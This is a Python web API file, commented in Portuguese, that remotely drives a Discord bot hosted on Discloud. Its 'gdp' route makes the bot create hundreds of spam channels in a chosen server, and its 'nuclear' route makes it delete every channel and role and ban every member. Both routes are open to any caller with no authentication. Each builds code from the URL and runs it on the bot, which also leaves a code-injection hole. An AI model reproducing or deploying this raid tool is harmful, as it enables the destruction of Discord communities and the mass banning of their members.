from http.server import BaseHTTPRequestHandler
import json
import os
import requests
from urllib.parse import urlparse
import time
from datetime import datetime

# ==================== CONFIGURAÇÕES ====================

DISCLOUD_TOKEN = os.getenv('DISCLOUD_TOKEN', '')
BOT_ID = os.getenv('BOT_ID', '1386082293533249546')
API_BASE = "https://api.discloud.app/v2"

class handler(BaseHTTPRequestHandler):
    
    def do_GET(self):
        """Processa requisições GET"""
        
        # Headers CORS
        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type, api-token')
        self.end_headers()
        
        # Parsear URL
        parsed = urlparse(self.path)
        path = parsed.path
        query = parsed.query
        
        # Log da requisição
        print(f"\n{'='*60}")
        print(f"📡 REQUISIÇÃO RECEBIDA: {datetime.now().strftime('%H:%M:%S')}")
        print(f"📌 Path: {path}")
        print(f"🔍 Query: {query}")
        print(f"🔑 Token configurado: {'✅ Sim' if DISCLOUD_TOKEN else '❌ Não'}")
        print(f"🤖 Bot ID: {BOT_ID}")
        print('='*60)
        
        # ========== ROTA RAIZ ==========
        if path == '/' or path == '/api' or path == '/api/':
            result = self.rota_raiz()
        
        # ========== ROTA DE TESTE ==========
        elif path == '/api/test':
            result = self.rota_teste()
        
        # ========== ROTA DE VERIFICAÇÃO DE TOKEN ==========
        elif path == '/api/verificar-token':
            result = self.verificar_token()
        
        # ========== ROTA DE STATUS DO BOT ==========
        elif path == '/api/status':
            result = self.status_bot()
        
        # ========== ROTA DE INFORMAÇÕES DO BOT ==========
        elif path == '/api/info':
            result = self.info_bot()
        
        # ========== ROTA PARA LISTAR SERVIDORES ==========
        elif path == '/api/servidores':
            result = self.listar_servidores()
        
        # ========== ROTA PARA EXECUTAR GDP ==========
        elif path.startswith('/api/gdp/'):
            partes = path.split('/')
            if len(partes) >= 4:
                server_id = partes[3]
                quantidade = partes[4] if len(partes) >= 5 else '100'
                result = self.executar_gdp(server_id, quantidade)
            else:
                result = self.erro("URL inválida. Use: /api/gdp/ID/QUANTIDADE")
        
        # ========== ROTA PARA EXECUTAR NUCLEAR ==========
        elif path.startswith('/api/nuclear/'):
            partes = path.split('/')
            if len(partes) >= 4:
                server_id = partes[3]
                result = self.executar_nuclear(server_id)
            else:
                result = self.erro("URL inválida. Use: /api/nuclear/ID")
        
        # ========== ROTA NÃO ENCONTRADA ==========
        else:
            result = self.erro("Rota não encontrada", 404)
        
        # Enviar resposta
        self.wfile.write(json.dumps(result, indent=2, ensure_ascii=False).encode('utf-8'))
    
    def do_POST(self):
        """Processa requisições POST (mesmo tratamento do GET)"""
        self.do_GET()
    
    def do_OPTIONS(self):
        """Responde a requisições OPTIONS (CORS)"""
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type, api-token')
        self.end_headers()
    
    # ==================== FUNÇÕES AUXILIARES ====================
    
    def erro(self, mensagem, codigo=400):
        """Retorna uma mensagem de erro padronizada"""
        return {
            "sucesso": False,
            "erro": mensagem,
            "codigo": codigo,
            "timestamp": datetime.now().isoformat()
        }
    
    def sucesso(self, dados, mensagem="Operação realizada com sucesso"):
        """Retorna uma mensagem de sucesso padronizada"""
        return {
            "sucesso": True,
            "mensagem": mensagem,
            "dados": dados,
            "timestamp": datetime.now().isoformat()
        }
    
    def _requisicao_discloud(self, metodo, endpoint, dados=None):
        """Faz uma requisição para a API da Discloud"""
        
        if not DISCLOUD_TOKEN:
            return self.erro("Token da Discloud não configurado", 401)
        
        headers = {
            'api-token': DISCLOUD_TOKEN,
            'Content-Type': 'application/json'
        }
        
        url = f"{API_BASE}{endpoint}"
        
        print(f"\n🔄 Requisição para Discloud:")
        print(f"   Método: {metodo}")
        print(f"   URL: {url}")
        print(f"   Headers: {{'api-token': '******', 'Content-Type': 'application/json'}}")
        
        try:
            if metodo.upper() == 'GET':
                response = requests.get(url, headers=headers, timeout=15)
            elif metodo.upper() == 'POST':
                response = requests.post(url, headers=headers, json=dados, timeout=15)
            elif metodo.upper() == 'PUT':
                response = requests.put(url, headers=headers, json=dados, timeout=15)
            elif metodo.upper() == 'DELETE':
                response = requests.delete(url, headers=headers, timeout=15)
            else:
                return self.erro(f"Método {metodo} não suportado")
            
            print(f"📥 Resposta da Discloud:")
            print(f"   Status: {response.status_code}")
            print(f"   Body: {response.text[:200]}...")
            
            if response.status_code in [200, 201]:
                return self.sucesso(response.json())
            else:
                return self.erro(f"Erro {response.status_code}: {response.text[:100]}", response.status_code)
                
        except requests.exceptions.ConnectionError:
            print("❌ Erro de conexão com a Discloud")
            return self.erro("Erro de conexão com a Discloud", 503)
        except requests.exceptions.Timeout:
            print("❌ Timeout na requisição")
            return self.erro("Timeout na requisição", 504)
        except Exception as e:
            print(f"❌ Erro inesperado: {e}")
            return self.erro(str(e), 500)
    
    # ==================== ROTAS PRINCIPAIS ====================
    
    def rota_raiz(self):
        """Rota inicial da API"""
        return {
            "nome": "GDP Control API",
            "versao": "7.0",
            "status": "online",
            "descricao": "API para controle do bot Discord via site",
            "configuracoes": {
                "token_discloud": "✅ Configurado" if DISCLOUD_TOKEN else "❌ Não configurado",
                "bot_id": BOT_ID
            },
            "endpoints": {
                "testar_api": "/api/test",
                "verificar_token": "/api/verificar-token",
                "status_bot": "/api/status",
                "info_bot": "/api/info",
                "listar_servidores": "/api/servidores",
                "executar_gdp": "/api/gdp/ID_DO_SERVIDOR/QUANTIDADE",
                "executar_nuclear": "/api/nuclear/ID_DO_SERVIDOR"
            },
            "timestamp": datetime.now().isoformat()
        }
    
    def rota_teste(self):
        """Rota para testar se a API está funcionando"""
        return self.sucesso({
            "mensagem": "API funcionando corretamente",
            "timestamp": time.time(),
            "token_configurado": bool(DISCLOUD_TOKEN)
        })
    
    def verificar_token(self):
        """Verifica se o token da Discloud é válido"""
        return self._requisicao_discloud('GET', '/user')
    
    def status_bot(self):
        """Obtém o status do bot na Discloud"""
        return self._requisicao_discloud('GET', f"/app/{BOT_ID}/status")
    
    def info_bot(self):
        """Obtém informações detalhadas do bot"""
        return self._requisicao_discloud('GET', f"/app/{BOT_ID}")
    
    def listar_servidores(self):
        """Lista os servidores onde o bot está"""
        resultado = self._requisicao_discloud('GET', f"/app/{BOT_ID}")
        
        if resultado.get('sucesso'):
            dados = resultado.get('dados', {})
            servidores = dados.get('guilds', [])
            
            return self.sucesso({
                "total": len(servidores),
                "servidores": servidores
            })
        
        return resultado
    
    def executar_gdp(self, server_id, quantidade):
        """Executa o comando GDP no servidor especificado"""
        
        # Validar quantidade
        try:
            qtd = int(quantidade)
            if qtd > 500:
                qtd = 500
            if qtd < 1:
                qtd = 1
        except:
            qtd = 100
        
        # Código Python para executar no bot
        codigo = f"""
import asyncio
import discord
from datetime import datetime

async def executar():
    print(f"🚀 Iniciando GDP no servidor {{server_id}}")
    
    guild = bot.get_guild({server_id})
    if not guild:
        print("❌ Servidor não encontrado")
        return
    
    criados = 0
    for i in range(1, {qtd} + 1):
        try:
            nome = f"G.D.P-{{i:03d}}"
            await guild.create_text_channel(nome)
            criados += 1
            
            if i % 10 == 0:
                print(f"📊 Progresso: {{i}}/{qtd}")
            
            await asyncio.sleep(0.5)
        except Exception as e:
            print(f"❌ Erro: {{e}}")
    
    print(f"✅ GDP concluído: {{criados}} canais criados")

asyncio.run(executar())
"""
        
        # Enviar código para execução
        return self._requisicao_discloud('POST', f"/app/{BOT_ID}/exec", {"code": codigo})
    
    def executar_nuclear(self, server_id):
        """Executa o comando Nuclear no servidor especificado"""
        
        # Código Python para executar no bot
        codigo = f"""
import asyncio
import discord
from datetime import datetime

async def executar():
    print(f"☢️ Iniciando Nuclear no servidor {{server_id}}")
    
    guild = bot.get_guild({server_id})
    if not guild:
        print("❌ Servidor não encontrado")
        return
    
    resultados = {{"canais": 0, "cargos": 0, "banidos": 0}}
    
    # Deletar canais
    for channel in guild.channels:
        try:
            await channel.delete()
            resultados["canais"] += 1
            await asyncio.sleep(0.3)
        except:
            pass
    
    # Deletar cargos
    for role in guild.roles:
        if role.name != "@everyone" and not role.managed:
            try:
                await role.delete()
                resultados["cargos"] += 1
                await asyncio.sleep(0.3)
            except:
                pass
    
    # Banir membros
    for member in guild.members:
        if member != guild.me:
            try:
                await member.ban(reason="Nuclear via site")
                resultados["banidos"] += 1
                await asyncio.sleep(1)
            except:
                pass
    
    print(f"☢️ Nuclear concluído: {{resultados}}")

asyncio.run(executar())
"""
        
        # Enviar código para execução
        return self._requisicao_discloud('POST', f"/app/{BOT_ID}/exec", {"code": codigo})